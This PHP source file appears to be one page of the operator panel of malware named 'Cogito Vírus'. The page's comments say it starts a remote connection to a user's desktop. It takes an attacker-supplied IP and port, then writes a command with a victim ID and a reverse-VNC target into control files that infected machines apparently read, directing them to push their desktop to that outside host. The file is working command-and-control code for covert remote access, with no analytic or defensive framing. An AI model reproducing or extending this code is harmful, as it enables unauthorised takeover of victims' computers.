<?php
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 
// 9348587272485853.php / ReverseVNC.php ~~
//    Arquivo responsável por ativar conexão remota com desktop do usuário...
//    
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	error_reporting(0);
	session_start();
	
	include("../modules/extras/global.php");	// Dados globais.
	include("../config.php");					// Configurações.
	include("0923840923949455.php");			// Itens globais do site.
	
	// Verifica login...
	if (!isset($_SESSION["LNG"])) { die($errorPage); }
	
	if (isset($_POST["ip"])) {
		if (isset($_POST["porta"])) {
			$ip = $_POST["ip"];
			$porta = $_POST["porta"];
			
			// Seta comando no arquivo de controle central...
			$UID = $_GET["UID"];
			$buf = "[CTLCTR]\nUID=". $UID ."\nCMD=877758621\n";
			$es = fopen("../databases/CTLCentral.ini", "w"); 
			if ($es) { fwrite($es, $buf); fclose($es); }
			
			// Seta comando em arquivo de controle do modulo...
			$buf = "[CTL]\nEDX=". $ip .":". $porta ."\n";
			$file = fopen("../modules/revvnc/CTL.ini", "w"); 
			if ($file) { fwrite($file, $buf); fclose($file); }
		}
	}
	
?>
<html><head>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type" />
<title> Cogito V&iacute;rus :: M&aacute;quinas</title>
<link rel="shortcut icon" href="<?php echo $faviconGL; ?>" type="image/x-icon" />
<link href="../midia/SiteFL/style.css" rel="stylesheet" type="text/css" />

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js"></script>
<script type="text/javascript">
	function FocusOnInput () {
		document.getElementById("ip").focus();
	}

	function SendX () {
		if (document.form.ip.value.length > 0) {
			if (document.form.porta.value.length > 0) {
				document.form.submit();
			} else {
				alert('Digite a porta...');
				document.form.porta.focus();
			}
		} else {
			alert('Digite o IP ou DNS...');
			document.form.ip.focus();
		}
	}
</script></head><body onload="FocusOnInput()">
<form name="form" method="post" enctype="multipart/form-data">
<center><pre><font style="color: white;"><?php echo $TopoMenu; ?><!-- Exibe topo e menu -->
|                                                                                                                                 |
|                                                                                                                                 |
|---------------<font style="color: #d6ef39;">/</font> <font style="color: #F28500;">Reverse VNC</font> <font style="color: #d6ef39;">/</font>---------------------------------------------------------------------------------------------------|
|                                                                                                                                 |
|                                                                                                                                 |
|                                           <font style="color: #F28500;">.------------------------------------.</font>                                                |
|                                           <font style="color: #F28500;">\  IP:</font> <input style="background-color: green; color: black; border: 0;" type="text" name="ip" id="ip" value="" size="21" /> <font style="color: #F28500;">:</font> <input style="background-color: green; color: black; border: 0;" type="text" name="porta" value="5500" size="8"/>  <font style="color: #F28500;">\</font>                                               |
|                                            <font style="color: #F28500;">`------------------------------------'</font>                                               |
|                                                                                                                                 |
|                                                                                                                                 |
|                                                                                                                                 |
|                                                        <font style="color: #F28500;">.------------.</font>                                                           |
|                                                        <font style="color: #F28500;">|</font>  <a href="#" onclick="Javascript: SendX();">CONECTAR</a>  <font style="color: #F28500;">|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</font>|
|                                                        <font style="color: #F28500;">'------------'</font>                                                           |
|                                                                                                                                 |
|                                                                                                                                 |
|                                                                                                                                 |<?php echo $RodapeCV; ?> <!-- Exibe rodapé -->
</font></pre>

</center>
<input class="filex" id="file" type="file" name="filex" />
</form>
</body></html>
<?php
// EOF  ~~ 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
?>
